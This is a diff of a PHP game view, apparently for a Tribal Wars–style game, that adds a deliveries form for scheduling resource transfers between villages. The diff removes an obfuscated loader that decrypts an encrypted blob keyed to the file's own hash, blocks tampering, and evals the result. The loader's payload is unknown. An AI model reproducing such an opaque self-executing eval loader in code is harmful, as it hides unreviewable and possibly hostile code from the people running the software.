@@ -1,24 +1,244 @@
 <?php
-$yjrmfwp="18405aab4093c9584b1a77c84bbf4872";
-$erzibrppx="570f02010354575b56080e04005b505b035409525556545952515a50075a0556";
-$frgclbya="Hu3ba+tH7YF3hsC7vGOu1SajcRcH1qq41xZD5F+4fxPVDGVWwPOlyCLcpr95Zj1jg5RRwUAcul+kjWA5M/AQTawhKxr7Q5Qi8RhHSd2RhH/LTkKtR7jGsJ7C29UQkKpY6RWvOnVrZXj1mP9kkX8VFTS8uRXNBDvPsTg94jPDEELP3H5FqFBKdPb0OkH/4TxiP0T7C6XO7W98LCerrH8teXl6pV74k9EKEE0iORfG1fwpZ5flaTKU2bQKCvpDej6tn+5CvTWotrw2EX72R1D7Zq7iHhNWU3vrP4OcH7+ykZckwvpbzEjHS1tYxtdO6B+HwviiWX3E374KkMNnElZAumB5AfDp4eYAZSpGnZZO3QINFhMl+QUhXf1/xlbI89BTU53A120nJHDMC73xHX+RY3Utkn9j5X6LLPU1G25Y0a6mCHthkQN8swc36jId55MRz+786Pg7Gs8zML/+I+OD/WNt0Bu0nnRdIoxuRA8UY/2nWR6gjrxesUf2caSq7zrdxwvxAEvVvStLTZKBk6buuJL69j+gdxOdbOH0mvDwdB5eCxfWDXNbf0BztnFqu+lAYxUv3Hq91saBQ/3o0+zjuuIuf328cbWxMyYSY4qyr9N2LoSGjPKH9Z39sUts3Jy5jafKYQBxZCFEeC/Agmy2DDBDOzzq2XeJEpTonBQ5RhMkBQxfY0aFyFNeABLedDkxRHQsaEQHANxOeiwaVaPdZqQHg0EQm5mN6JYhw8VtstOMYjQgAyAEG1Cuk4gJd3bsHiiDqbl5f8ntaqoHDsY/lOZrNJrWF7JrpeL2If52YK8Cz16i2hPRA03GoM50sYpxySkqgxWFfGOYobhJKGvqSKsi04054obCJR91nDXMIXyCXWTpXunpTm+L+3U2HNvMeRMxRtb25ByjygA8pSkg0LNzW7VxLrg2NPWbeh/JZu1gLiBgyKFEj3YfE1ISroRXF9UL4V3WbJCr90Zdvwx7lypTjxBQqJe0QHfQl+FAgjgqd6H+RGBtTbrsXthMtKufEURSFuRI5ny4Mg8X36q3lpbXjQlcMk943E94Qp6acccNQgoNjKoS+B/jEPamFsjMO33ZjWuPm2AEp3hCDvXdLn6azvqBIKaQdolSmk5enROy2VAfxRLXF4NnV+roYR3XVui/67k7S9VUAd+xgrrVDo9Z5EwTjrJ/sMEt8pEHCVIL7NgqwZopnLo71KmHyGAfpUE43HiWMN/2SWDtJOgHSKHAW/pL1siiHh+EVpRhPcme/23wNA3u17ME1klFOnpZSv0MXlAhStbSBNiiMt6pnUHpaVO4/+9s5cb+LWzfB8jJgsDrvu0HFGWCgd/NGPNWGvMFCXEuDk0W/MyDHA5PqqpkjpweWvdYZaxnz4TQvy15EGOmlLqFsYiGNCeDeM13tZzropRu4aHN3m4SESzGiJJ0B9HF+OOtEAkZJQFbFwE/yBUbFTzuRAHJIUOMxE1USZGG1KgkG8Vl2rmgP9ePyudAkG1o7HUFMrVCfmCYYfRoFnLD8cFGhfZv+4xWg0b6fWsHJpVACHb7Mf2iqb6R+WvIWpAC66A6H9nPvODTjw+XgBgZuVCQ0VImpAAR26EmJWSka+jyRS+fPYm6wXZPe0v2itVWKsmFHC2wtK72fbIPSEGwfR/z3E07aNcTKJo8pNc/aNL3a4fySH/J1pO7TV67bcTAMTH7qgWCplQIT4VoE5JL+EwOSTJnAeW2uaSTQxWJEgnl6d/CYipwQFAJR7dL0q20LaMhvlmgmMbiapWWNNzxDy78KkmBWCoQzc8DCY/p8Uw2QePvqUR49P+SRizd0xEdF3BfcLjffOJXJEP/sUNcFUoeneUb+m5ng9aCngXBqQcJnyMn8nO7+LQ2cCADMHdxlmdpEdYYyS85D5GjahxBJ6t0j4yht7IqxSNAdLDtuvWg+kAuPBdNFfTm6+obmWcEGTAkjNTW6wcjLcp9G7c3e0UJkKI2zjl1VoJFm3HkCUF0JhOTt8QVhHJoE0q6XeajroiWZpL2xWpFICf+SmUKzehy+4Ipo2fWYCbszhm2Q+pbs7pcLTQwG6UUOTmMocWJ3g7HD5mzZmZTwxNgS1s8vD5cjd6CLENMhkXbyCO0NO4q6+A4E+Hng5Tekpym/E6Nzc+eM36isdO8ujnJ/HgpbB14XotN4SqI300rYKD7aFg6p0SNKTCGp0+/DwEVq7WTfiZPRzjsGrOv8vFZMv4QZ17Kac2noaT9PqAyiqempTC5bBRBSOuNAtOrpLZLydfDur7hgnjQxOCx05EV12w6cVrt7b+xizAIcSOrBeeA1v6sAeUgR/wA+Qf9VWkStPQMPfPE5qxcOpIzZCRt1DkEQo4R95Vw0micwT1H/B9rr/lzjtmJT5F4bW0CBZg5LAdS9SrMORh2mHMUooq6jZuJz/XNOspNnYJGkedKw8lFVh+YXdJKnUL8Bi64XmQdDeSJalZjzZD63CsMJa3bvVVAEcfGpdlfNevZErwyj6hTb2ENtILUrxOUqKc2gd4Nu+YSw2DXb7NrvqAsoPWqe8PfzSChLlsAIxJdrf7iA8CtqIFTZur6jk3o839J4OlZedLxrlDTxnNE2IDCyhhfz8d6smsa1998j5dUAsIaft1tMeDZyFkCBUHvztSz3CPaYOSH6A3gjv/ogtyXYJcgvTh1zjB5fEpoNMG79jF+nqM1q+KYX+HgoPRWtYLAjZjs2Z15si6RBHMWQvF0lLWZQ2Fegogu38nM0z4aVJT46Sk4AQCebms9hb8B77aF3p/z9ZK7V1TwdNO1/9Twy36+bNAtRnPMRcmuqZ4o0X1AjMoJXBJvWOdNKuLT/OzuoJrJOqaSTuo=";
-$wfcqwejsxi=file_get_contents(__FILE__);
-$nubkubu=str_replace($frgclbya,"",$wfcqwejsxi);
-if(strpos($nubkubu,"ec"."ho")!==false||strpos($nubkubu,"pr"."int")!==false||strpos($nubkubu,"var_"."dump")!==false||strpos($nubkubu,"file_put_"."contents")!==false||strpos($nubkubu,"fw"."rite")!==false){die();}
-$qqpeywtku=str_replace(array($yjrmfwp,$erzibrppx),array("SP_1a5ffe41","KP_e9e79c0e"),$wfcqwejsxi);
-$abzgbky=md5($qqpeywtku);
-$rirrmzb=hex2bin($erzibrppx);
-$ksqjofdkz="";
-$tdwepzo=strlen($abzgbky);
-for($umqhvhde=0;$umqhvhde<$tdwepzo;$umqhvhde++){
-$ksqjofdkz.=chr(ord($rirrmzb[$umqhvhde])^ord($abzgbky[$umqhvhde]));
-}
-$unazfko=base64_decode($frgclbya);
-$hqpruqibx=strlen($unazfko);
-$nrxqaazwz="";
-$nsmscz=strlen($ksqjofdkz);
-for($umqhvhde=0;$umqhvhde<$hqpruqibx;$umqhvhde++){
-$nrxqaazwz.=$unazfko[$umqhvhde]^$ksqjofdkz[$umqhvhde%$nsmscz];
-}
-$truvmvuh="gzun"."compress";
-eval('?>' . $truvmvuh($nrxqaazwz) . '<?php ');
+/**
+ * Account Manager - Deliveries Mode
+ * Create and manage supply routes between villages
+ */
+?>
+
+<h3><?= __('screens.accountmanager.deliveries.title') ?></h3>
+
+<form method="post" action="game.php?village=<?= $village['id'] ?>&screen=accountmanager&mode=deliveries&action=create">
+
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="2"><?= __('screens.accountmanager.deliveries.start') ?></th>
+        </tr>
+        <tr>
+            <td width="150"><strong><?= __('screens.accountmanager.deliveries.village') ?></strong></td>
+            <td>
+                <select name="source_village" style="width: 300px;">
+                    <option value=""><?= __('screens.accountmanager.deliveries.choose_village') ?></option>
+                    <?php if (!empty($villages)): ?>
+                        <?php foreach ($villages as $v): ?>
+                            <option value="<?= $v['id'] ?>">
+                                <?= htmlspecialchars($v['name']) ?> (<?= $v['x'] ?>|<?= $v['y'] ?>) K<?= $v['continent'] ?>
+                            </option>
+                        <?php endforeach; ?>
+                    <?php endif; ?>
+                </select>
+
+                <div style="float: right;">
+                    <a href="#" id="link_src_fav"><?= __('screens.accountmanager.deliveries.favorites') ?></a><br>
+                    <a href="#" id="link_src_recent"><?= __('screens.accountmanager.deliveries.last_villages') ?></a><br>
+                    <a href="#" id="link_src_history"><?= __('screens.accountmanager.deliveries.history') ?></a>
+                </div>
+            </td>
+        </tr>
+    </table>
+
+    <br>
+
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="2"><?= __('screens.accountmanager.deliveries.target') ?></th>
+        </tr>
+        <tr>
+            <td width="150"><strong><?= __('screens.accountmanager.deliveries.village') ?></strong></td>
+            <td>
+                <select name="target_village" style="width: 300px;">
+                    <option value=""><?= __('screens.accountmanager.deliveries.choose_village') ?></option>
+                    <?php if (!empty($villages)): ?>
+                        <?php foreach ($villages as $v): ?>
+                            <option value="<?= $v['id'] ?>">
+                                <?= htmlspecialchars($v['name']) ?> (<?= $v['x'] ?>|<?= $v['y'] ?>) K<?= $v['continent'] ?>
+                            </option>
+                        <?php endforeach; ?>
+                    <?php endif; ?>
+                </select>
+
+                <div style="float: right;">
+                    <a href="#" id="link_tgt_all"><?= __('screens.accountmanager.deliveries.all_villages') ?></a><br>
+                    <a href="#" id="link_tgt_own"><?= __('screens.accountmanager.deliveries.your_villages') ?></a><br>
+                    <a href="#" id="link_tgt_history"><?= __('screens.accountmanager.deliveries.history') ?></a>
+                </div>
+            </td>
+        </tr>
+    </table>
+
+    <br>
+
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="2"><?= __('screens.accountmanager.deliveries.resources') ?></th>
+        </tr>
+        <tr>
+            <td width="150">
+                <img src="/graphic/icons/wood.png" style="vertical-align: middle;" /> <strong><?= __('screens.accountmanager.deliveries.wood') ?></strong>
+            </td>
+            <td>
+                <input type="number" name="wood" value="0" min="0" style="width: 100px;">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <img src="/graphic/icons/stone.png" style="vertical-align: middle;" /> <strong><?= __('screens.accountmanager.deliveries.clay') ?></strong>
+            </td>
+            <td>
+                <input type="number" name="clay" value="0" min="0" style="width: 100px;">
+            </td>
+        </tr>
+        <tr>
+            <td>
+                <img src="/graphic/icons/iron.png" style="vertical-align: middle;" /> <strong><?= __('screens.accountmanager.deliveries.iron') ?></strong>
+            </td>
+            <td>
+                <input type="number" name="iron" value="0" min="0" style="width: 100px;">
+            </td>
+        </tr>
+    </table>
+
+    <br>
+
+    <table class="vis" width="100%">
+        <tr>
+            <th colspan="8"><?= __('screens.accountmanager.deliveries.days_time') ?></th>
+        </tr>
+        <tr>
+            <td><input type="checkbox" name="days[]" value="monday" id="day_mon"><label for="day_mon"><?= __('screens.accountmanager.deliveries.monday') ?></label>
+            </td>
+            <td><input type="checkbox" name="days[]" value="tuesday" id="day_tue"><label for="day_tue"><?= __('screens.accountmanager.deliveries.tuesday') ?></label>
+            </td>
+            <td><input type="checkbox" name="days[]" value="wednesday" id="day_wed"><label for="day_wed"><?= __('screens.accountmanager.deliveries.wednesday') ?></label>
+            </td>
+            <td><input type="checkbox" name="days[]" value="thursday" id="day_thu"><label for="day_thu"><?= __('screens.accountmanager.deliveries.thursday') ?></label>
+            </td>
+            <td><input type="checkbox" name="days[]" value="friday" id="day_fri"><label for="day_fri"><?= __('screens.accountmanager.deliveries.friday') ?></label></td>
+            <td><input type="checkbox" name="days[]" value="saturday" id="day_sat"><label for="day_sat"><?= __('screens.accountmanager.deliveries.saturday') ?></label>
+            </td>
+            <td><input type="checkbox" name="days[]" value="sunday" id="day_sun"><label for="day_sun"><?= __('screens.accountmanager.deliveries.sunday') ?></label>
+            </td>
+            <td>
+                <input type="checkbox" name="all_days" id="all_days"><label for="all_days"><?= __('screens.accountmanager.deliveries.all_days') ?></label>
+
+                <strong style="margin-left: 20px;"><?= __('screens.accountmanager.deliveries.time') ?></strong>
+                <input type="time" name="time" value="00:00" style="width: 80px;">
+
+                <img src="/graphic/new/questionmark.webp" style="background-position: 0 0; width: 14px; height: 14px;"
+                    alt="<?= __('screens.accountmanager.deliveries.info') ?>">
+            </td>
+        </tr>
+    </table>
+
+    <br>
+
+    <div style="text-align: center;">
+        <input type="hidden" name="h" value="<?= $hkey ?>">
+        <button type="submit" class="btn"><?= __('screens.accountmanager.deliveries.create') ?></button>
+    </div>
+</form>
+
+<script>
+    // Toggle all days checkbox
+    document.getElementById('all_days').addEventListener('change', function () {
+        const dayCheckboxes = document.querySelectorAll('input[name="days[]"]');
+        dayCheckboxes.forEach(cb => cb.checked = this.checked);
+    });
+
+    // Source village filters
+    const sourceSelect = document.querySelector('select[name="source_village"]');
+    const sourceOptions = Array.from(sourceSelect.options).slice(1); // Skip first "Escolher aldeia..."
+
+    // Favoritos - Show favorite villages (placeholder - would need backend support)
+    document.getElementById('link_src_fav').addEventListener('click', function (e) {
+        e.preventDefault();
+        // For now, just show all villages
+        // In future: filter by favorites from user preferences
+        alert('<?= __('screens.accountmanager.deliveries.alert_fav') ?>');
+    });
+
+    // Últimas aldeias - Show recently used source villages
+    document.getElementById('link_src_recent').addEventListener('click', function (e) {
+        e.preventDefault();
+        // Get from localStorage
+        const recent = JSON.parse(localStorage.getItem('recentSourceVillages') || '[]');
+        if (recent.length === 0) {
+            alert('<?= __('screens.accountmanager.deliveries.alert_no_recent_src') ?>');
+            return;
+        }
+
+        // Filter select to show only recent
+        sourceSelect.innerHTML = '<option value=""><?= __('screens.accountmanager.deliveries.choose_village') ?></option>';
+        sourceOptions.forEach(opt => {
+            if (recent.includes(opt.value)) {
+                sourceSelect.appendChild(opt.cloneNode(true));
+            }
+        });
+    });
+
+    // Histórico - Show history of source villages
+    document.getElementById('link_src_history').addEventListener('click', function (e) {
+        e.preventDefault();
+        // Reset to show all
+        sourceSelect.innerHTML = '<option value=""><?= __('screens.accountmanager.deliveries.choose_village') ?></option>';
+        sourceOptions.forEach(opt => sourceSelect.appendChild(opt.cloneNode(true)));
+    });
+
+    // Target village filters
+    const targetSelect = document.querySelector('select[name="target_village"]');
+    const targetOptions = Array.from(targetSelect.options).slice(1);
+
+    // Todas as aldeias - Show all villages in world (would need backend)
+    document.getElementById('link_tgt_all').addEventListener('click', function (e) {
+        e.preventDefault();
+        alert('<?= __('screens.accountmanager.deliveries.alert_all_villages') ?>');
+    });
+
+    // As suas aldeias - Show only user villages (already default)
+    document.getElementById('link_tgt_own').addEventListener('click', function (e) {
+        e.preventDefault();
+        // Reset to user villages (default)
+        targetSelect.innerHTML = '<option value=""><?= __('screens.accountmanager.deliveries.choose_village') ?></option>';
+        targetOptions.forEach(opt => targetSelect.appendChild(opt.cloneNode(true)));
+    });
+
+    // Histórico - Show history of target villages
+    document.getElementById('link_tgt_history').addEventListener('click', function (e) {
+        e.preventDefault();
+        const recent = JSON.parse(localStorage.getItem('recentTargetVillages') || '[]');
+        if (recent.length === 0) {
+            alert('<?= __('screens.accountmanager.deliveries.alert_no_recent_tgt') ?>');
+            return;
+        }
+
+        targetSelect.innerHTML = '<option value=""><?= __('screens.accountmanager.deliveries.choose_village') ?></option>';
+        targetOptions.forEach(opt => {
+            if (recent.includes(opt.value)) {
+                targetSelect.appendChild(opt.cloneNode(true));
+            }
+        });
+    });
+
+    // Save to history when form is submitted
+    document.querySelector('form').addEventListener('submit', function () {
+        const sourceValue = sourceSelect.value;
+        const targetValue = targetSelect.value;
+
+        if (sourceValue) {
+            let recent = JSON.parse(localStorage.getItem('recentSourceVillages') || '[]');
+            if (!recent.includes(sourceValue)) {
+                recent.unshift(sourceValue);
+                recent = recent.slice(0, 10); // Keep last 10
+                localStorage.setItem('recentSourceVillages', JSON.stringify(recent));
+            }
+        }
+
+        if (targetValue) {
+            let recent = JSON.parse(localStorage.getItem('recentTargetVillages') || '[]');
+            if (!recent.includes(targetValue)) {
+                recent.unshift(targetValue);
+                recent = recent.slice(0, 10); // Keep last 10
+                localStorage.setItem('recentTargetVillages', JSON.stringify(recent));
+            }
+        }
+    });
+</script>
